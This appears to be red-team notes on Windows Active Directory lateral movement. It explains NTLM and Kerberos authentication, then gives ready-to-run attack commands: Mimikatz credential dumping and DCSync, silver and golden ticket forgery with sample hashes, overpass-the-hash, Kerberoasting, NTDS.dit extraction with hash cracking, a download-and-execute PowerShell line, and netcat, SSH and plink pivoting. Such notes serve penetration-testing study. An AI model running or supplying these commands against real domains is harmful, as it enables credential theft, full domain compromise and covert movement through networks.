## Windows Authentication

### LM
Was being used by default before windows vista, windows server 2008 (Weak hashing algorithm).

### NT Hash (NTLM)
Currently used for storing passwords at windows systems (Used for pass-the-hash attack).

### LM & NTLM Dump
```
# Dump from memory (Mimikatz)
privilege::debug
sekurlsa::logonpasswords

# Dump from SAM database
reg save HKLM\sam sam
reg save HKLM\system system
lsadump::sam /system:system /sam:sam //Mimikatz

# Dump from Domain Controller
lsadump::dcsync /domain:marvel.local /all /csv //Mimikatz (needs domain admin)
```

### NTLMv1 (Net-NTLMv1)
Not stored locally, used on the fly while authentication.

### NTLMv2 (Net-NTLMv2)
Same as NTLMv1, just with some modification on the encryption algorithm.

### NTLM Authentication Mechanism
- The user enters his username and password.
- The client initiates a negotiation request with the server, that request includes any information about the client capabilities as well as the Dialect or the protocols that the client supports.
- The server picks up the highest dialect and replies through the Negotiation response message then the authentication starts.
- The client then negotiates an authentication session with the server to ask for access.
- The server responds to the request by sending an NTLM challenge.
- The client then encrypts that challenge with his own pre-entered password’s hash (NTLM Hash) and sends his username, challenge, and challenge-response back to the server (Net-NTLM Hash).
- The server tries to encrypt the challenge as well using its own copy of the user’s hash (NTLM Hash) which is stored locally on the server in case of local authentication, or pass the information to the domain controller in case of domain authentication, comparing it to the challenge-response, if equal then the login is successful.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen1.png?raw=true)

Note: To use NTLM authentication instead of Kerberos authentication, access IP addresses instead of Hostnames dir \\10.0.2.100\c$.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen2.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen3.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen4.png?raw=true)

LM / NTLM Hashes are used for Pass-The-Hash attacks, while Net-NTLMv1 / Net-NTLMv2 Hashes are used for NTLM Relay attacks.

Pass-The-Hash will do all the same previous authentication process because of all this process based on the user's hash, not the user's password.

NTLM Relay attack takes place at the Session Setup Request Authentication step.

## Kerberos Authentication

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen5.png?raw=true)

- The client hashes the user’s password, uses that hash to encrypt the current timestamp, and sends the encrypted timestamp to the KDC. The KDC already has a copy of the user’s hash so it uses the hash and tries to decrypt that message to retrieve the timestamp. If the decryption is successful, then the KDC knows that the client used the correct hash and hence proved his identity to that KDC.
- The Authentication service (AS) replies with two messages:
	- A session key encrypted using the user’s hash, that key will be used for future messages.
	- TGT (ticket-granting ticket), That TGT contains information regarding the user and his privileges on the domain, This message is encrypted using the hash of the KRBTGT account’s password. That hash is known only to the KDC, so only the KDC can decrypt the TGT.
- The client now has the TGT, he then requests a ticket to access the service he wants, so the client encrypts that request using the session key and sends it to the KDC which will decrypt and validate it. The TGT is also sent in that request.
- After validating the TGT the KDC responds with two messages:
	- A message specialized for the targeted service, encrypted with the service’s hash which is stored at the KDC, this includes the information in the TGT as well as a session key.
	- A message for the client containing a session key for further requests between the client and the service he asked to access, which is encrypted using the key retrieved from the AS-REP step.
- The client presents the message (TGS) from the TGS-REP step while connecting to the service along with an encrypted part, called authenticator message, this part includes the user’s name and timestamp which was encrypted and will be decrypted using the service session key. Then compare the username and timestamp from the TGS with the username and timestamp from the authenticator message.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen6.png?raw=true)

### Silver Ticket (Forged TGS)
```
# Silver Ticket
mimikatz # kerberos::golden /user:administrator /domain:marvel.local /sid:S-1-5-21-410602843-3916082903-3170366279 /target:hydra-dc /service:cifs /rc4:86bafceb975cb8237cf2d390faa04074 
mimikatz # kerberos::ptt ticket.kirbi

# CMD
klist
dir \\hydra-dc\c$
```

- user: Username, this can be any user, even an invalid one will work.
- domain: The domain name.
- sid: Domain sid, can be obtained via many methods, whoami /user is one.
- target: Target machine.
- service: The service name, CIFS as am accessing filesharing service.
- rc4: NTLM hash of the target service.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen7.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen8.png?raw=true)

Note: we can use the target machine hash as the service hash for filesharing service (CIFS).

### Golden Ticket (Forged TGT)
```
# Dump krbtgt hash (run as domain admin)
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:marvel.local /all /csv

# Golden Ticket
mimikatz # kerberos::golden /user:invaliduser /domain:marvel.local /sid:S-1-5-21-410602843-3916082903-3170366279 /rc4:249030b29d08621192b77cb5c8580fad 
mimikatz # kerberos::ptt ticket.kirbi
exit

# CMD
klist
dir \\hydra-dc\c$
```

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen9.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen10.png?raw=true)

In the golden ticket, you’re not restricted to a single service, you got the KRBTGT, you can create your own TGT, so you can create a TGS for any service you want.

### OverPass The Hash
```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:administrator /domain:marvel.local /ntlm:ead0cc57ddaae50d876b7dd6386fa9c7

# New CMD (use hostname instead of IP to authenticate using Kerberos)
dir //hydra-dc/c$
psexec //hydra-dc cmd
```

### Kerbroasting
```
git clone https://github.com/nidem/kerberoast

# Get all SPNs
.\GetUserSPNs.ps1

# Request ticket for specific service
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "Hydra-DC/SQLService.MARVEL.local:60111" 

# Extract the tickets from memory
mimikatz # kerberos::list /export

# Crack the ticket
python tgsrepcrack.py wordlist.txt Administrator@Hydra-DC~SQLService.MARVEL.LOCAL.kirbi
```

## Domain Controller NTDS Dumping

### NTDSutil
```
ntdsutil
activate instance ntds
ifm
create full C:\audit
quit
quit
```
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen11.png?raw=true)

Then use DSInternals script to extract all the hashed from this dump.

```
// https://github.com/MichaelGrafnetter/DSInternals/releases/latest
​
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHiveFilePath '.\audit\registry\SYSTEM'
Get-ADDBAccount -All -DBPath '.\audit\Active Directory\ntds.dit' -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt -Encoding ascii
```
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen12.png?raw=true)

### Mimikatz
```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:marvel.local /all /csv"'
```
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen13.png?raw=true)

### Invoke DCSync
```
// https://gist.githubusercontent.com/monoxgas/9d238accd969550136db/raw/7806cc26744b6025e8f1daf616bc359cb6a11965/Invoke-DCSync.ps1
​
IEX (New-Object Net.WebClient).DownloadString("https://gist.githubusercontent.com/monoxgas/9d238accd969550136db/raw/7806cc26744b6025e8f1daf616bc359cb6a11965/Invoke-DCSync.ps1");
Invoke-DCSync -PWDumpFormat
```

### Cracking
```
hashcat.exe -m 1000 -a 0 --username hashes.txt rockyou.txt
```
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen14.png?raw=true)

## Pivoting & Port Forwarding

### Local Port Forwarding

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen15.png?raw=true)

1- Rinetd
```
# Target Machine // 10.0.0.1
Python -m SimpleHTTPServer 80

# Gateway Machine
apt-get install rinetd
nano /etc/rinetd.conf
    localhost    localport    remotehost    remoteport     
    127.0.0.1    53            10.0.0.1    80

# Kali Machine // http://gatway:53 → http://10.0.0.1:80
```

2- Netcat
```
# Target Machine // 10.0.0.1
nc -lnvp 22

# Gateway Machine
mknod relaynode p
nc -lvnp 1111 0<relaynode | nc 10.0.0.1 22 1>relaynode

# Kali Machine
nc gateway 1111
```

3- SSH
```
# Target Machine // 10.0.0.1
Python -m SimpleHTTPServer 80

# Gateway Machine
nano /etc/ssh/sshd_config
    Port 53

# Kali Machine
// Now we will connect to the gateway through ssh on port 53, then we will connect
// port 8080 on the internal machine with port 80 on the web server machine. 
ssh user@gateway -p 53 -L 127.0.0.1:8080:10.0.0.1:80
// Now browse to http://127.0.0.1:8080 -> http://10.0.0.1:80
```

### Remote Port Forwarding

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen16.png?raw=true)

1- SSH
```
# Kali Machine // 10.0.0.1
nano /etc/ssh/sshd_config
    Port 53

# Target Machine
// let’s assume that port 3389 is open internaly only.
nc -nvlp 3389
// Now we will connect to my kali machine through ssh on port 53, then we will
// connect port 4444 on kali with port 3389 on the target machine.
ssh user@10.0.0.1 -p 53 -R 10.0.0.1:4444:127.0.0.1:3389
// Now try to connect to port 4444 on kali machine.
```

2- Plink.exe
```
# kali Machine // 10.0.0.1
nano /etc/ssh/sshd_config
    Port 53

# Target Windows Machine
// let’s assume that port 3389 is open internaly only.
nc -nvlp 3389
// Now we will connect to my kali machine through ssh on port 53, then we will
// connect port 4444 on kali with port 3389 on the target windows machine.
cmd.exe /c echo y | plink.exe -ssh -l user -pw pass -P 53 -R 10.0.0.1:4444:127.0.0.1:3389 10.0.0.1
// Now try to connect to port 4444 on kali machine.
```

### Dynamic Port Forwarding

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen17.png?raw=true)

```
# Target Machine // 10.0.0.1
// SSH open on any port for example 22.

# Kali Machine
// Listen on port 9050 and any thing come to this port send it to the webserver on port 22.
ssh -D 127.0.0.1:9050 user@10.0.0.1 -p 22

nano /etc/proxychains.conf
    socks4 127.0.0.1 9050

proxychains nmap -sn 192.168.1.0/24
```
